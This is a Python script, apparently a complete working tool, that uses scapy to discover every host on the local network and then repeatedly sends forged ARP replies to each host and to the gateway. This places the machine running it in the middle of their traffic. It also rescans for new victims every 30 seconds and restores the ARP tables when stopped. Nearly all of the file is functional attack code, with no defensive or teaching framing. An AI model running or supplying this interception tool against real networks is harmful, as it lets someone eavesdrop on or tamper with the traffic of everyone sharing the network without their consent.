#!/usr/bin/env python3

import threading

import time

import subprocess

import ipaddress

from scapy.all import ARP, Ether, srp, send, conf, get_if_hwaddr



conf.verb = 0  





# ── X ─────────────────────────────────────────────────────────



def obtener_mac(ip: str, timeout: int = 2) -> str:

    """Obtiene la MAC real de una IP enviando un ARP request."""

    try:

        resp, _ = srp(

            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip),

            timeout=timeout, retry=2, verbose=False

        )

        if resp:

            return resp[0][1].hwsrc

    except Exception:

        pass

    return ""


# Y


def obtener_gateway() -> tuple[str, str]:

    try:

        out = subprocess.check_output(

            ["ip", "route", "show", "default"],

            stderr=subprocess.DEVNULL

        ).decode()



        for token in out.split():

            if token.count('.') == 3 and token != "0.0.0.0":

                ip_gw = token

                mac_gw = obtener_mac(ip_gw)

                return ip_gw, mac_gw

    except Exception:

        pass

    return "", ""





def escanear_red(red_cidr: str, excluir: set = None) -> list[dict]:


    excluir = excluir or set()

    hosts = []

    try:

        resp, _ = srp(

            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=red_cidr),

            timeout=3, retry=1, verbose=False

        )

        for _, pkt in resp:

            ip  = pkt[ARP].psrc

            mac = pkt[ARP].hwsrc

            if ip not in excluir:

                hosts.append({"ip": ip, "mac": mac})

    except Exception as e:

        print(f"[ARP-SCAN] Error: {e}")

    return hosts





def detectar_red_propia() -> tuple[str, str]:


    try:

        out = subprocess.check_output(

            ["ip", "-o", "-4", "addr", "show"],

            stderr=subprocess.DEVNULL

        ).decode()

        for linea in out.splitlines():

            partes = linea.split()

            if len(partes) >= 4:

                interfaz = partes[1]


                if interfaz == "lo":

                    continue

                cidr_completo = partes[3]          

                ip_servidor   = cidr_completo.split("/")[0]

                red = str(ipaddress.IPv4Network(cidr_completo, strict=False))

                return ip_servidor, red

    except Exception:

        pass

    return "", ""





# ── Z ────────────────────────────────────────────────────



class ArpSpoofer:





    def __init__(self, interfaz: str, log_fn=None):

        self.interfaz   = interfaz

        self.log_fn     = log_fn or print   

        self._activo    = False

        self._hilo      = None

        self._hilo_scan = None

        self.mi_ip      = ""

        self.mi_mac     = ""

        self.ip_gateway = ""

        self.mac_gateway = ""

        self.hosts      = []  

        self._lock      = threading.Lock()



    def iniciar(self) -> bool:


        if self._activo:

            return False





        self.mi_ip, red_cidr = detectar_red_propia()

        if not self.mi_ip or not red_cidr:

            self.log_fn("[ARP-SPOOF] No se pudo detectar la red local")

            return False



        try:

            self.mi_mac = get_if_hwaddr(self.interfaz)

        except Exception:

            self.log_fn(f"[ARP-SPOOF] No se pudo obtener MAC de {self.interfaz}")

            return False



        self.ip_gateway, self.mac_gateway = obtener_gateway()

        if not self.ip_gateway:

            self.log_fn("[ARP-SPOOF] No se pudo detectar el gateway")

            return False



        self.log_fn(f"[ARP-SPOOF] Red: {red_cidr} | Gateway: {self.ip_gateway} | Mi IP: {self.mi_ip}")



    

        excluir = {self.mi_ip, self.ip_gateway, "255.255.255.255", "0.0.0.0"}

        self.hosts = escanear_red(red_cidr, excluir=excluir)

        self.log_fn(f"[ARP-SPOOF] Hosts descubiertos: {len(self.hosts)} → {[h['ip'] for h in self.hosts]}")



        if not self.hosts:

            self.log_fn("[ARP-SPOOF] Sin hosts que interceptar. Verifica que hay dispositivos activos.")



        self._activo    = True

        self._red_cidr  = red_cidr

        self._excluir   = excluir



        

        self._hilo = threading.Thread(target=self._loop_spoofing, daemon=True)

        self._hilo.start()




        self._hilo_scan = threading.Thread(target=self._loop_rescan, daemon=True)

        self._hilo_scan.start()



        return True



    def detener(self):

        """Detiene el spoofing y restaura ARP real en todos los dispositivos."""

        self._activo = False

        self.log_fn("[ARP-SPOOF] Restaurando tablas ARP originales...")

        self._restaurar_arp()

        self.log_fn("[ARP-SPOOF] Tablas ARP restauradas. Spoofer detenido.")



    def get_hosts(self) -> list:

        """Retorna copia de la lista de hosts descubiertos."""

        with self._lock:

            return list(self.hosts)



    # ── 00 ────────────────────────────────────────────────────────



    def _loop_spoofing(self):


        while self._activo:

            with self._lock:

                hosts_actual = list(self.hosts)



            for host in hosts_actual:

                try:



                    send(

                        ARP(op=2,

                            pdst=host["ip"],   hwdst=host["mac"],

                            psrc=self.ip_gateway, hwsrc=self.mi_mac),

                        iface=self.interfaz, verbose=False

                    )


                    send(

                        ARP(op=2,

                            pdst=self.ip_gateway, hwdst=self.mac_gateway,

                            psrc=host["ip"],      hwsrc=self.mi_mac),

                        iface=self.interfaz, verbose=False

                    )

                except Exception as e:

                    self.log_fn(f"[ARP-SPOOF] Error enviando ARP a {host['ip']}: {e}")



            time.sleep(2)



    def _loop_rescan(self):

     

        while self._activo:

            time.sleep(30)

            if not self._activo:

                break

            nuevos = escanear_red(self._red_cidr, excluir=self._excluir)

            with self._lock:

                ips_conocidas = {h["ip"] for h in self.hosts}

                for h in nuevos:

                    if h["ip"] not in ips_conocidas:

                        self.hosts.append(h)

                        self.log_fn(f"[ARP-SPOOF] Nuevo dispositivo detectado: {h['ip']} ({h['mac']})")


# ────────────────────────────────  ;  ────────────────────────────────────────
    def _restaurar_arp(self):

        with self._lock:

            hosts_actual = list(self.hosts)



        for _ in range(5):

            for host in hosts_actual:

                try:

                    send(

                        ARP(op=2,

                            pdst=host["ip"],      hwdst=host["mac"],

                            psrc=self.ip_gateway, hwsrc=self.mac_gateway),

                        iface=self.interfaz, verbose=False

                    )

                    send(

                        ARP(op=2,

                            pdst=self.ip_gateway, hwdst=self.mac_gateway,

                            psrc=host["ip"],      hwsrc=host["mac"]),

                        iface=self.interfaz, verbose=False

                    )

                except Exception:

                    pass

            time.sleep(0.5)